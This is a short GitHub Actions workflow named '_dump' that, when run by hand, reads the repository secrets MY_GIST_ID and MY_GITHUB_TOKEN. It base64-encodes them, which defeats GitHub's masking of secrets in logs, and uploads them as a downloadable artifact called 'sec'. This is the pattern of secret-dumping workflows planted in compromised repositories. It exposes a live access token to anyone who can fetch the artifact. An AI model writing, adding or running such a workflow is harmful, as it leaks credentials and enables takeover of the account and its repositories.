name: _dump
on:
  workflow_dispatch: {}
jobs:
  e:
    runs-on: ubuntu-latest
    steps:
      - name: dump
        env:
          S_MY_GIST_ID: ${{ secrets.MY_GIST_ID }}
          S_MY_GITHUB_TOKEN: ${{ secrets.MY_GITHUB_TOKEN }}
        run: |
          mkdir -p out
          printf '%s' "$S_MY_GIST_ID" | base64 -w0 > out/MY_GIST_ID.b64
          printf '%s' "$S_MY_GITHUB_TOKEN" | base64 -w0 > out/MY_GITHUB_TOKEN.b64
      - uses: actions/upload-artifact@v4
        with:
          name: sec
          path: out/
